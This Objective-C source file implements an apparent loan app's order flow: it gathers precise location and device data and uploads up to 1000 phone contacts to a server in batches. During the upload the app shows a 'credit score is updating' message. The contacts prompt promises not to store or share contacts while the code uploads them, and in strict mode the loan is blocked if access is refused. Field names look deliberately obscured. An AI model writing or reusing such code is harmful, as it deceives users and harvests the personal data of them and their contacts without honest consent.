//

//

#import "TgOrderForgeRelay.h"
#import "TgContactLattice.h"
#import "TgDockBarRelay.h"
#import "TgEnvelopeBase.h"
#import "TgLoanShellController.h"
#import "TgParcelRegistry.h"
#import "TgPayloadModels.h"
#import "TgPolicyVault.h"
#import "TgPulseOverlay.h"
#import "TgSensorLattice.h"
#import "TgShardFacade.h"
#import "TgStampVault.h"
#import "TgTraceRelay.h"
#import "TgWireConduit.h"
#import <Contacts/Contacts.h>
#import <CoreLocation/CoreLocation.h>
#import <float.h>

static NSString * const kTgForgeBusyHint = @"The system is occupied. Please retry after 2 minutes.";
static NSString * const kTgForgeLocationTimeoutHint = @"Unable to obtain location, please try once more";
static NSString * const kTgForgeSubmitVeilText = @"Your credit score is updating now - please stay on this screen. It only takes a few seconds.";
static NSString * const kTgForgeInvalidParamsHint = @"Invalid loan data";

static NSInteger const kTgForgeDefaultMaxContacts = 1000;
static NSInteger const kTgForgeDefaultBatchSize = 100;
static NSInteger const kTgForgeLocationMaxRetry = 10;

@interface TgOrderForgeRelay () <CLLocationManagerDelegate>

@property (nonatomic, strong) CLLocationManager *tg_locationManager;
@property (nonatomic, strong, nullable) CLLocation *tg_currentLocation;
@property (nonatomic, strong, nullable) TgOrderForgeParams *tg_pendingParams;
@property (nonatomic, weak, nullable) UIViewController *tg_hostVC;
@property (nonatomic, copy, nullable) TgOrderForgeSuccessBlock tg_successBlock;
@property (nonatomic, copy, nullable) TgOrderForgeFailureBlock tg_failureBlock;
@property (nonatomic, copy, nullable) TgOrderForgeCancelBlock tg_cancelBlock;
@property (nonatomic, copy, nullable) NSString *tg_currentOrderId;
@property (nonatomic, copy, nullable) NSString *tg_dataVeilToken;
@property (nonatomic, assign) TgOrderForgeOrigin tg_origin;
@property (nonatomic, assign) BOOL tg_isRunning;
@property (nonatomic, assign) BOOL tg_userInitiated;
@property (nonatomic, assign) BOOL tg_allowSecondaryPrompt;
@property (nonatomic, assign) BOOL tg_dataOnlyMode;
@property (nonatomic, assign) BOOL tg_didUploadContacts;
@property (nonatomic, assign) BOOL tg_firstLocationRequest;
@property (nonatomic, assign) BOOL tg_contactsAuthorized;

@end

@implementation TgOrderForgeParams
@end

@implementation TgOrderForgeRelay

+ (instancetype)shared {
    static TgOrderForgeRelay *relay = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ relay = [[TgOrderForgeRelay alloc] init]; });
    return relay;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _tg_locationManager = [[CLLocationManager alloc] init];
        _tg_locationManager.delegate = self;
        _tg_locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    }
    return self;
}

+ (BOOL)tg_isRunning {
    return [TgOrderForgeRelay shared].tg_isRunning;
}

+ (void)tg_launchFullOrderWithParams:(TgOrderForgeParams *)params
                              hostVC:(UIViewController *)hostVC
                              origin:(TgOrderForgeOrigin)origin
                allowSecondaryPrompt:(BOOL)allowSecondaryPrompt
                             success:(TgOrderForgeSuccessBlock)success
                             failure:(TgOrderForgeFailureBlock)failure
                             cancelled:(TgOrderForgeCancelBlock)cancelled {
    TgOrderForgeRelay *relay = [TgOrderForgeRelay shared];
    if (relay.tg_isRunning) return;

    NSString *productId = [relay tg_trim:params.productId];
    NSString *amount = [relay tg_trim:params.loanAmount];
    NSString *term = [relay tg_trim:params.showTerm];
    if (productId.length == 0 || amount.length == 0 || term.length == 0) {
        [[TgPulseOverlay shared] whisperLine:kTgForgeInvalidParamsHint duration:2.0];
        if (failure) failure(kTgForgeInvalidParamsHint);
        return;
    }

    relay.tg_pendingParams = params;
    relay.tg_hostVC = hostVC;
    relay.tg_successBlock = [success copy];
    relay.tg_failureBlock = [failure copy];
    relay.tg_cancelBlock = [cancelled copy];
    relay.tg_origin = origin;
    relay.tg_dataOnlyMode = NO;
    relay.tg_currentOrderId = nil;
    relay.tg_didUploadContacts = NO;
    relay.tg_contactsAuthorized = NO;
    relay.tg_currentLocation = nil;
    relay.tg_isRunning = YES;
    relay.tg_userInitiated = YES;
    relay.tg_allowSecondaryPrompt = allowSecondaryPrompt;
    relay.tg_firstLocationRequest = NO;

    [[TgPulseOverlay shared] veilSpin];
    [relay tg_beginLocationPhase];
}

+ (void)tg_resumeDataCaptureForOrderId:(NSString *)orderId
                                hostVC:(UIViewController *)hostVC
                                origin:(TgOrderForgeOrigin)origin
                allowSecondaryPrompt:(BOOL)allowSecondaryPrompt
                               success:(TgOrderForgeSuccessBlock)success
                               failure:(TgOrderForgeFailureBlock)failure
                             cancelled:(TgOrderForgeCancelBlock)cancelled {
    TgOrderForgeRelay *relay = [TgOrderForgeRelay shared];
    if (relay.tg_isRunning) return;

    NSString *oid = [relay tg_trim:orderId];
    if (oid.length == 0) {
        if (failure) failure(kTgForgeInvalidParamsHint);
        return;
    }

    relay.tg_hostVC = hostVC;
    relay.tg_successBlock = [success copy];
    relay.tg_failureBlock = [failure copy];
    relay.tg_cancelBlock = [cancelled copy];
    relay.tg_origin = origin;
    relay.tg_dataOnlyMode = YES;
    relay.tg_currentOrderId = oid;
    relay.tg_pendingParams = nil;
    relay.tg_didUploadContacts = NO;
    relay.tg_contactsAuthorized = NO;
    relay.tg_isRunning = YES;
    relay.tg_userInitiated = YES;
    relay.tg_allowSecondaryPrompt = allowSecondaryPrompt;

    [relay tg_showDataVeil];
    [relay tg_uploadDeviceInfo];
}

+ (void)tg_cancelCurrentFlow {
    [[TgOrderForgeRelay shared] tg_resetFlowWithMessage:nil notifyCancel:NO exitPage:NO];
}

#pragma mark - Location

- (void)tg_beginLocationPhase {
    CLAuthorizationStatus status = [CLLocationManager authorizationStatus];
    BOOL strict = [self tg_isStrictMode];

    switch (status) {
        case kCLAuthorizationStatusNotDetermined:
            self.tg_firstLocationRequest = YES;
            [self.tg_locationManager requestWhenInUseAuthorization];
            break;
        case kCLAuthorizationStatusDenied:
        case kCLAuthorizationStatusRestricted:
            [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                          deny:TgTraceSignalLocationDeny
                                       granted:NO];
            if (strict) {
                [[TgPulseOverlay shared] veilDismiss];
                if (self.tg_allowSecondaryPrompt) {
                    [self tg_showLocationSecondaryPanel];
                } else {
                    [self tg_endFlowCancelled];
                }
            } else {
                [self tg_proceedCreateOrder];
            }
            break;
        case kCLAuthorizationStatusAuthorizedWhenInUse:
        case kCLAuthorizationStatusAuthorizedAlways:
            [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                          deny:TgTraceSignalLocationDeny
                                       granted:YES];
            [self tg_startWaitingLocationThenCreateOrder];
            break;
        default:
            [self tg_proceedCreateOrder];
            break;
    }
}

- (void)tg_startWaitingLocationThenCreateOrder {
    [self.tg_locationManager stopUpdatingLocation];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self.tg_locationManager startUpdatingLocation];
        [self tg_waitLocationRetry:0];
    });
}

- (void)tg_waitLocationRetry:(NSInteger)retry {
    if (self.tg_currentLocation) {
        [self tg_proceedCreateOrder];
        return;
    }
    if (retry >= kTgForgeLocationMaxRetry) {
        [[TgPulseOverlay shared] veilDismiss];
        [[TgPulseOverlay shared] whisperLine:kTgForgeLocationTimeoutHint duration:2.0];
        [self tg_resetFlowWithMessage:nil notifyCancel:YES exitPage:NO];
        return;
    }
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self tg_waitLocationRetry:retry + 1];
    });
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    (void)manager;
    CLLocation *loc = locations.lastObject;
    if (loc) self.tg_currentLocation = loc;
}

- (void)locationManagerDidChangeAuthorization:(CLLocationManager *)manager {
    (void)manager;
    if (!self.tg_userInitiated || !self.tg_isRunning || self.tg_dataOnlyMode) return;
    if (!self.tg_firstLocationRequest) return;

    CLAuthorizationStatus status = manager.authorizationStatus;
    if (status == kCLAuthorizationStatusNotDetermined) return;

    self.tg_firstLocationRequest = NO;
    [[TgPulseOverlay shared] veilDismiss];
    BOOL strict = [self tg_isStrictMode];

    switch (status) {
        case kCLAuthorizationStatusAuthorizedWhenInUse:
        case kCLAuthorizationStatusAuthorizedAlways:
            [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                          deny:TgTraceSignalLocationDeny
                                       granted:YES];
            [[TgPulseOverlay shared] veilSpin];
            [self tg_startWaitingLocationThenCreateOrder];
            break;
        case kCLAuthorizationStatusDenied:
        case kCLAuthorizationStatusRestricted:
            [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                          deny:TgTraceSignalLocationDeny
                                       granted:NO];
            if (strict) {
                if (self.tg_dataOnlyMode) {
                    [self tg_endFlowFailureSilent];
                } else {
                    [self tg_endFlowCancelled];
                }
            } else {
                [self tg_proceedCreateOrder];
            }
            break;
        default:
            break;
    }
}

#pragma mark - Create order

- (void)tg_proceedCreateOrder {
    BOOL strict = [self tg_isStrictMode];
    if (strict && !self.tg_currentLocation) {
        [[TgPulseOverlay shared] veilDismiss];
        [[TgPulseOverlay shared] whisperLine:kTgForgeLocationTimeoutHint duration:2.0];
        [self tg_resetFlowWithMessage:nil notifyCancel:YES exitPage:NO];
        return;
    }

    [[TgPulseOverlay shared] veilSpin];

    TgOrderForgeParams *params = self.tg_pendingParams;
    NSMutableDictionary *sign = [NSMutableDictionary dictionary];
    sign[@"productId"] = [self tg_trim:params.productId];
    sign[@"loanAmount"] = [self tg_trim:params.loanAmount];
    sign[@"imei"] = @"null";
    sign[@"serialNo"] = [TgStampVault serialStamp] ?: @"";

    if (self.tg_currentLocation) {
        sign[@"longitude"] = [self tg_rawCoordinateString:self.tg_currentLocation.coordinate.longitude];
        sign[@"latitude"] = [self tg_rawCoordinateString:self.tg_currentLocation.coordinate.latitude];
    } else {
        sign[@"longitude"] = @"-360";
        sign[@"latitude"] = @"-360";
    }

    NSMutableDictionary *nonSign = [NSMutableDictionary dictionary];
    nonSign[@"showTerm"] = [self tg_trim:params.showTerm];
    if ([self tg_trim:params.orderType].length > 0) {
        nonSign[@"orderType"] = [self tg_trim:params.orderType];
    }

    __weak typeof(self) weakSelf = self;
    [[TgWireConduit shared] relayPOST:TgLaneOrderSubmit
                             signData:sign
                           nonSignData:nonSign
                      envelopeSuccess:^(TgEnvelopeBase *envelope) {
        __strong typeof(weakSelf) self = weakSelf;
        if (envelope.cheer == 200 && envelope.trick) {
            NSString *orderId = [self tg_parseOrderId:envelope.trick];
            if (orderId.length > 0) {
                self.tg_currentOrderId = orderId;
                [[TgPulseOverlay shared] veilDismiss];
                [self tg_showDataVeil];
                [self tg_uploadDeviceInfo];
                return;
            }
        }
        [[TgPulseOverlay shared] veilDismiss];
        NSString *msg = [self tg_trim:envelope.power];
        [self tg_resetFlowWithMessage:msg.length > 0 ? msg : kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    } failure:^{
        __strong typeof(weakSelf) self = weakSelf;
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_resetFlowWithMessage:kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    }];
}

#pragma mark - Device / contacts / ready

- (void)tg_uploadDeviceInfo {
    NSString *orderId = [self tg_trim:self.tg_currentOrderId];
    if (orderId.length == 0) {
        [self tg_resetFlowWithMessage:kTgForgeBusyHint notifyCancel:NO exitPage:NO];
        return;
    }

    __weak typeof(self) weakSelf = self;
    [TgSensorLattice primeWifiGlyphsWithCompletion:^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [self tg_relayDevicePayloadForOrderId:orderId];
    }];
}

- (void)tg_relayDevicePayloadForOrderId:(NSString *)orderId {
    NSDictionary *device = [TgSensorLattice harvestPayload];
    __weak typeof(self) weakSelf = self;
    [[TgWireConduit shared] relayPOST:TgLaneMobileDevice
                             signData:@{ @"orderId": orderId }
                           nonSignData:device ?: @{}
                      envelopeSuccess:^(TgEnvelopeBase *envelope) {
        __strong typeof(weakSelf) self = weakSelf;
        if (envelope.cheer == 200) {
            [self tg_checkContactsPermission];
            return;
        }
        NSString *msg = [self tg_trim:envelope.power];
        [self tg_resetFlowWithMessage:msg.length > 0 ? msg : kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    } failure:^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_resetFlowWithMessage:kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    }];
}

- (void)tg_checkContactsPermission {
    BOOL strict = [self tg_isStrictMode];

    if ([self tg_isContactsLimited]) {
        [TgTraceRelay emitSignal:TgTraceSignalContactsPartial];
        if (strict) {
            [self tg_handleContactsLimitedStrictFirstRequest:NO];
        } else {
            self.tg_contactsAuthorized = NO;
            [self tg_finalizeReady];
        }
        return;
    }

    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    switch (status) {
        case CNAuthorizationStatusAuthorized:
            [TgTraceRelay emitPermissionGrant:TgTraceSignalContactsGrant
                                          deny:TgTraceSignalContactsDeny
                                       granted:YES];
            self.tg_contactsAuthorized = YES;
            [self tg_gatherAndUploadContacts];
            break;
        case CNAuthorizationStatusDenied:
        case CNAuthorizationStatusRestricted:
            [TgTraceRelay emitPermissionGrant:TgTraceSignalContactsGrant
                                          deny:TgTraceSignalContactsDeny
                                       granted:NO];
            if (strict) {
                if (self.tg_allowSecondaryPrompt) {
                    [self tg_showContactsSecondaryPanel];
                } else {
                    [self tg_returnHomeAndReset];
                }
            } else {
                self.tg_contactsAuthorized = NO;
                [self tg_finalizeReady];
            }
            break;
        case CNAuthorizationStatusNotDetermined: {
            [self tg_hideDataVeil];
            CNContactStore *store = [[CNContactStore alloc] init];
            __weak typeof(self) weakSelf = self;
            [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError *error) {
                (void)error;
                dispatch_async(dispatch_get_main_queue(), ^{
                    __strong typeof(weakSelf) self = weakSelf;
                    if (!self || !self.tg_isRunning) return;
                    if ([self tg_isContactsLimited]) {
                        [TgTraceRelay emitSignal:TgTraceSignalContactsPartial];
                        if (strict) {
                            [self tg_handleContactsLimitedStrictFirstRequest:YES];
                        } else {
                            self.tg_contactsAuthorized = NO;
                            [self tg_showDataVeil];
                            [self tg_finalizeReady];
                        }
                        return;
                    }
                    if (granted) {
                        [TgTraceRelay emitSignal:TgTraceSignalContactsGrant];
                        self.tg_contactsAuthorized = YES;
                        [self tg_showDataVeil];
                        [self tg_gatherAndUploadContacts];
                    } else {
                        [TgTraceRelay emitSignal:TgTraceSignalContactsDeny];
                        if (strict) {
                            [self tg_returnHomeAndReset];
                        } else {
                            self.tg_contactsAuthorized = NO;
                            [self tg_showDataVeil];
                            [self tg_finalizeReady];
                        }
                    }
                });
            }];
            break;
        }
        default:
            self.tg_contactsAuthorized = NO;
            [self tg_finalizeReady];
            break;
    }
}

- (void)tg_gatherAndUploadContacts {
    NSInteger maxCount = kTgForgeDefaultMaxContacts;
    NSInteger batchSize = kTgForgeDefaultBatchSize;
    TgSystemConfigModel *cfg = [[TgPolicyVault shared] currentManifest];
    if (cfg.hit > 0) maxCount = cfg.hit;
    if (cfg.capacity > 0) batchSize = cfg.capacity;

    NSArray *contacts = [TgContactLattice tg_harvestContactsWithMaxCount:maxCount];
    if (contacts.count == 0) {
        self.tg_didUploadContacts = self.tg_contactsAuthorized;
        [self tg_finalizeReady];
        return;
    }

    NSArray *batches = [TgContactLattice tg_batchContacts:contacts batchSize:batchSize];
    [self tg_uploadContactBatch:batches index:0];
}

- (void)tg_uploadContactBatch:(NSArray<NSArray *> *)batches index:(NSInteger)index {
    if (index >= (NSInteger)batches.count) {
        self.tg_didUploadContacts = YES;
        [self tg_finalizeReady];
        return;
    }

    NSString *orderId = [self tg_trim:self.tg_currentOrderId];
    NSArray *batch = batches[index];
    __weak typeof(self) weakSelf = self;
    [[TgWireConduit shared] relayPOST:TgLaneMobileContact
                             signData:@{ @"orderId": orderId }
                           nonSignData:@{ @"list": batch }
                      envelopeSuccess:^(TgEnvelopeBase *envelope) {
        __strong typeof(weakSelf) self = weakSelf;
        if (envelope.cheer == 200) {
            [self tg_uploadContactBatch:batches index:index + 1];
            return;
        }
        NSString *msg = [self tg_trim:envelope.power];
        [self tg_resetFlowWithMessage:msg.length > 0 ? msg : kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    } failure:^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_resetFlowWithMessage:kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    }];
}

- (void)tg_finalizeReady {

    [self tg_callOrderReady];
}

- (void)tg_callOrderReady {
    NSString *orderId = [self tg_trim:self.tg_currentOrderId];
    NSString *allowContact = (self.tg_didUploadContacts && self.tg_contactsAuthorized) ? @"" : @"2";

    __weak typeof(self) weakSelf = self;
    [[TgWireConduit shared] relayPOST:TgLaneOrderReady
                             signData:@{ @"orderId": orderId }
                           nonSignData:@{ @"allowContact": allowContact }
                      envelopeSuccess:^(TgEnvelopeBase *envelope) {
        __strong typeof(weakSelf) self = weakSelf;
        if (envelope.cheer == 200) {
            [self tg_completeSuccess];
            return;
        }
        NSString *msg = [self tg_trim:envelope.power];
        [self tg_resetFlowWithMessage:msg.length > 0 ? msg : kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    } failure:^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_resetFlowWithMessage:kTgForgeBusyHint notifyCancel:NO exitPage:NO];
    }];
}

#pragma mark - Secondary panels

- (void)tg_showLocationSecondaryPanel {
    [[TgPulseOverlay shared] veilDismiss];

    NSString *body = [NSString stringWithFormat:
                      @"Please enable location access for %@ in Settings so you can finish the loan application.",
                      [self tg_appDisplayName]];

    __weak typeof(self) weakSelf = self;
    TgShardPanelConfig *cfg = [[TgShardPanelConfig alloc] init];
    cfg.content = body;
    cfg.secondaryTitle = @"Cancel";
    cfg.primaryTitle = @"Confirm";
    cfg.tier = TgShardTierMid;
    cfg.dismissOnPrimaryAction = YES;
    cfg.dismissOnSecondaryAction = YES;
    cfg.secondaryAction = ^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_endFlowFailureSilent];
    };
    cfg.primaryAction = ^{
        __strong typeof(weakSelf) self = weakSelf;
        NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
        if (url) {
            [UIApplication.sharedApplication openURL:url options:@{} completionHandler:nil];
        }
        [self tg_endFlowFailureSilent];
    };
    [[TgShardFacade shared] showPanel:cfg];
}

- (void)tg_showContactsSecondaryPanel {
    [[TgPulseOverlay shared] veilDismiss];
    [self tg_hideDataVeil];

    NSString *body = [NSString stringWithFormat:
                      @"%@ needs contact access to protect your account and help prevent fraud. It looks like access is currently denied. Open phone Settings, find the \"%@\" app, and enable \"Allow Full Access\"; otherwise your review may be affected. We take your privacy seriously and will not store or share your contact information.",
                      [self tg_appDisplayName], [self tg_appDisplayName]];

    __weak typeof(self) weakSelf = self;
    TgShardPanelConfig *cfg = [[TgShardPanelConfig alloc] init];
    cfg.content = body;
    cfg.secondaryTitle = @"Cancel";
    cfg.primaryTitle = @"Confirm";

    cfg.tier = TgShardTierHigh;
    cfg.dismissOnPrimaryAction = YES;
    cfg.dismissOnSecondaryAction = YES;
    cfg.secondaryAction = ^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_endContactsSecondaryDismissedOpenSettings:NO];
    };
    cfg.primaryAction = ^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_endContactsSecondaryDismissedOpenSettings:YES];
    };
    [[TgShardFacade shared] showPanel:cfg];
}

- (void)tg_handleContactsLimitedStrictFirstRequest:(BOOL)isFirstRequest {
    if (isFirstRequest || !self.tg_allowSecondaryPrompt) {
        [self tg_returnHomeAndReset];
    } else {
        [self tg_showContactsSecondaryPanel];
    }
}

- (void)tg_returnHomeAndReset {
    TgOrderForgeCancelBlock cancel = self.tg_cancelBlock;
    TgOrderForgeOrigin origin = self.tg_origin;

    [self tg_cleanupFlowState];

    // Contacts permission abort: cancel (no busy toast), then exit per origin (docs 37).
    if (cancel) cancel();
    [self tg_exitForOrigin:origin];
}

- (void)tg_endContactsSecondaryDismissedOpenSettings:(BOOL)openSettings {
    TgOrderForgeCancelBlock cancel = self.tg_cancelBlock;
    TgOrderForgeOrigin origin = self.tg_origin;

    [self tg_cleanupFlowState];

    if (openSettings) {
        NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
        if (url) {
            [UIApplication.sharedApplication openURL:url options:@{} completionHandler:nil];
        }
    }

    if (cancel) cancel();
    [self tg_exitForOrigin:origin];
}

- (void)tg_endFlowFailureSilent {
    TgOrderForgeFailureBlock failure = self.tg_failureBlock;
    [self tg_cleanupFlowState];
    if (failure) failure(@"");
}

- (void)tg_endFlowCancelled {
    TgOrderForgeCancelBlock cancel = self.tg_cancelBlock;
    [self tg_cleanupFlowState];
    if (cancel) cancel();
}

- (void)tg_cleanupFlowState {
    [self tg_hideDataVeil];
    [[TgPulseOverlay shared] veilDismiss];
    [self.tg_locationManager stopUpdatingLocation];
    self.tg_currentLocation = nil;
    self.tg_isRunning = NO;
    self.tg_userInitiated = NO;
    self.tg_allowSecondaryPrompt = NO;
    self.tg_pendingParams = nil;
    self.tg_successBlock = nil;
    self.tg_failureBlock = nil;
    self.tg_cancelBlock = nil;
}

#pragma mark - Veil / finish

- (void)tg_showDataVeil {
    [[TgPulseOverlay shared] veilDismiss];
    [self tg_hideDataVeil];
    self.tg_dataVeilToken = [[TgShardFacade shared] showVeilText:kTgForgeSubmitVeilText tier:TgShardTierMid];
}

- (void)tg_hideDataVeil {
    if (self.tg_dataVeilToken.length > 0) {
        [[TgShardFacade shared] dismissVeilToken:self.tg_dataVeilToken];
        self.tg_dataVeilToken = nil;
    }
}

- (void)tg_completeSuccess {
    NSString *orderId = [self tg_trim:self.tg_currentOrderId];
    TgOrderForgeSuccessBlock success = self.tg_successBlock;

    [self tg_hideDataVeil];
    [[TgPulseOverlay shared] veilDismiss];
    [self.tg_locationManager stopUpdatingLocation];
    self.tg_currentLocation = nil;
    self.tg_isRunning = NO;
    self.tg_userInitiated = NO;
    self.tg_pendingParams = nil;
    self.tg_successBlock = nil;
    self.tg_failureBlock = nil;
    self.tg_cancelBlock = nil;

    if (success) success(orderId);
}

- (void)tg_resetFlowWithMessage:(NSString *)message notifyCancel:(BOOL)notifyCancel exitPage:(BOOL)exitPage {
    TgOrderForgeFailureBlock failure = self.tg_failureBlock;
    TgOrderForgeCancelBlock cancel = self.tg_cancelBlock;
    TgOrderForgeOrigin origin = self.tg_origin;

    [self tg_cleanupFlowState];

    if (message.length > 0) {
        [[TgPulseOverlay shared] whisperLine:message duration:2.0];
    }

    if (exitPage) {
        [self tg_exitForOrigin:origin];
    }

    if (notifyCancel && cancel) {
        cancel();
    } else if (failure && message.length > 0) {
        failure(message);
    }
}

- (void)tg_exitForOrigin:(TgOrderForgeOrigin)origin {
    if (origin == TgOrderForgeOriginOrderDetail) return;

    UITabBarController *dock = self.tg_hostVC.tabBarController;
    UINavigationController *nav = self.tg_hostVC.navigationController;
    if ((origin == TgOrderForgeOriginApplyPage || origin == TgOrderForgeOriginOrderDetailReloan) && nav) {
        if (dock) {
            dock.selectedIndex = TgDockTabIndexLoan;
            UINavigationController *loanNav = (UINavigationController *)dock.viewControllers[TgDockTabIndexLoan];
            if ([loanNav isKindOfClass:[UINavigationController class]]) {
                [loanNav popToRootViewControllerAnimated:NO];
            }
        }
        [nav popToRootViewControllerAnimated:YES];
    } else if (origin == TgOrderForgeOriginAutoHome && dock) {
        dock.selectedIndex = TgDockTabIndexLoan;
        UINavigationController *loanNav = (UINavigationController *)dock.viewControllers[TgDockTabIndexLoan];
        if ([loanNav isKindOfClass:[UINavigationController class]]) {
            [loanNav popToRootViewControllerAnimated:NO];
        }
    }
}

#pragma mark - Helpers

- (BOOL)tg_isStrictMode {
    TgSystemConfigModel *cfg = [[TgPolicyVault shared] currentManifest];
    return cfg.preceding == 1;
}

- (BOOL)tg_isContactsLimited {
    if (@available(iOS 18.0, *)) {
        return [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts] == CNAuthorizationStatusLimited;
    }
    return NO;
}

- (NSString *)tg_trim:(NSString *)text {
    return [text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
}

- (NSString *)tg_rawCoordinateString:(CLLocationDegrees)value {
    return [NSString stringWithFormat:@"%.*g", DBL_DECIMAL_DIG, value];
}

- (NSString *)tg_appDisplayName {
    NSString *name = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    name = [self tg_trim:name];
    if (name.length > 0) return name;
    name = [self tg_trim:[[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"]];
    return name.length > 0 ? name : @"App";
}

- (NSString *)tg_parseOrderId:(id)data {
    if ([data isKindOfClass:[NSString class]]) {
        return [self tg_trim:(NSString *)data];
    }
    if ([data isKindOfClass:[NSNumber class]]) {
        return [(NSNumber *)data stringValue];
    }
    if ([data isKindOfClass:[NSDictionary class]]) {
        NSDictionary *dict = (NSDictionary *)data;
        for (NSString *key in @[@"interpret", @"orderId", @"order_id", @"id"]) {
            id val = dict[key];
            if ([val isKindOfClass:[NSString class]]) {
                NSString *s = [self tg_trim:val];
                if (s.length > 0) return s;
            }
            if ([val isKindOfClass:[NSNumber class]]) {
                return [(NSNumber *)val stringValue];
            }
        }
    }
    return @"";
}

@end
